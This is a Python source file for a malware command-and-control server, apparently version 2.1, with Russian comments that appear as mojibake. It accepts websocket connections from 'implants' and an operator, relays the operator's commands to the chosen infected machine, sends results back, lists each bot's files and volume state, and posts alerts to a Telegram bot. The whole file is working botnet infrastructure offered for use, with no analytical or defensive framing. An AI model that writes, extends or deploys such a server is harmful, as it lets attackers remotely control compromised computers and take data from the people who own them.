#
# --- –§–∞–π–ª: c2_server.py (–í–µ—Ä—Å–∏—è 2.1 - –°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–π) ---
# –ò—Å–ø—Ä–∞–≤–ª–µ–Ω —Ñ–æ—Ä–º–∞—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–ø–∏—Å–∫–∞ –±–æ—Ç–æ–≤, —á—Ç–æ–±—ã –æ–Ω —Å–æ–≤–ø–∞–¥–∞–ª
# —Å —Ç–µ–º, –∫–æ—Ç–æ—Ä—ã–π –æ–∂–∏–¥–∞–µ—Ç index.html v6.6.
#
import asyncio
import json
import os
import threading
import urllib.parse
import urllib.request
from aiohttp import web
import settings

def send_telegram_message(message):
    """–ê—Å–∏–Ω—Ö—Ä–æ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ."""
    def send():
        try:
            url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
            urllib.request.urlopen(url, timeout=10)
        except Exception as e:
            print(f"[!] –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram: {e}")
    threading.Thread(target=send, daemon=True).start()

IMPLANTS, OPERATOR = {}, None

async def websocket_handler(request):
    global OPERATOR, IMPLANTS

    ws = web.WebSocketResponse(heartbeat=25.0)
    await ws.prepare(request)

    client_type, client_id = None, None
    try:
        initial_msg = await ws.receive_json(timeout=15.0)
        client_type = initial_msg.get('type')

        if client_type == 'operator':
            OPERATOR = ws
            print("[+] –û–ø–µ—Ä–∞—Ç–æ—Ä –ø–æ–¥–∫–ª—é—á–∏–ª—Å—è.")
            await broadcast_bot_list()
        elif client_type == 'implant':
            client_id = initial_msg.get('id')
            IMPLANTS[client_id] = { "ws": ws, "initial_data": initial_msg }
            print(f"[+] –ù–æ–≤—ã–π –∏–º–ø–ª–∞–Ω—Ç –æ–Ω–ª–∞–π–Ω: {client_id}")
            send_telegram_message(f"‚úÖ –ò–º–ø–ª–∞–Ω—Ç –û–ù–õ–ê–ô–ù: {client_id}")
            await broadcast_bot_list()
        else:
            await ws.close()
            return ws

        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                if msg.data == 'ping':
                    await ws.send_str('pong')
                    continue

                data = json.loads(msg.data)

                if client_type == 'operator':
                    target_id = data.get('target_id')
                    if data['type'] == 'command' and target_id in IMPLANTS:
                        await IMPLANTS[target_id]["ws"].send_json(data['payload'])
                    elif data['type'] == 'get_details' and target_id in IMPLANTS:
                        initial_data = IMPLANTS[target_id].get("initial_data", {})
                        details ={
                            "files": initial_data.get("files"),
                            "volume_state": initial_data.get("volume_state") 
                        }
                        await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})

                elif client_type == 'implant':
                    data['bot_id'] = client_id
                    if OPERATOR and not OPERATOR.closed:
                        await OPERATOR.send_json(data)

    except asyncio.TimeoutError:
        print("[!] –¢–∞–π–º–∞—É—Ç –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è.")
    except Exception as e:
        print(f"[!] –û—à–∏–±–∫–∞ –≤ websocket_handler: {e}")
    finally:
        if client_type == 'implant' and client_id in IMPLANTS:
            del IMPLANTS[client_id]
            print(f"[-] –ò–º–ø–ª–∞–Ω—Ç –æ—Ç–∫–ª—é—á–∏–ª—Å—è: {client_id}")
            send_telegram_message(f"‚ùå –ò–º–ø–ª–∞–Ω—Ç –û–¢–ö–õ–Æ–ß–ò–õ–°–Ø: {client_id}")
            await broadcast_bot_list()
        elif client_type == 'operator':
            OPERATOR = None
            print("[-] –û–ø–µ—Ä–∞—Ç–æ—Ä –æ—Ç–∫–ª—é—á–∏–ª—Å—è.")
    return ws

# <<< –ì–õ–ê–í–ù–û–ï –ò–°–ü–†–ê–í–õ–ï–ù–ò–ï –ó–î–ï–°–¨ >>>
async def broadcast_bot_list():
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä—É –¥–µ—Ç–∞–ª—å–Ω—ã–π —Å–ø–∏—Å–æ–∫ –±–æ—Ç–æ–≤ –≤ –≤–∏–¥–µ –æ–±—ä–µ–∫—Ç–æ–≤."""
    if OPERATOR and not OPERATOR.closed:
        # –°–æ–±–∏—Ä–∞–µ–º —Å–ø–∏—Å–æ–∫ –û–ë–™–ï–ö–¢–û–í, –∞ –Ω–µ –ø—Ä–æ—Å—Ç–æ –∏–º–µ–Ω
        bot_list_with_details = [{'id': bot_id} for bot_id in IMPLANTS.keys()]
        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list_with_details})

async def http_handler(request):
    return web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'index.html'))

async def main():
    app = web.Application()
    app.router.add_get('/', http_handler)
    app.router.add_get('/ws', websocket_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"====== C2 SERVER (V2.1 –°–∏–Ω—Ö—Ä–æ–Ω) ONLINE –Ω–∞ –ø–æ—Ä—Ç—É {port} ======")
    send_telegram_message("üöÄ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω.")
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n–°–µ—Ä–≤–µ—Ä –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä—É—á–Ω—É—é.")
    finally:
        send_telegram_message("üõë –°–µ—Ä–≤–µ—Ä '–ö—Ä–µ–ø–æ—Å—Ç—å' –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
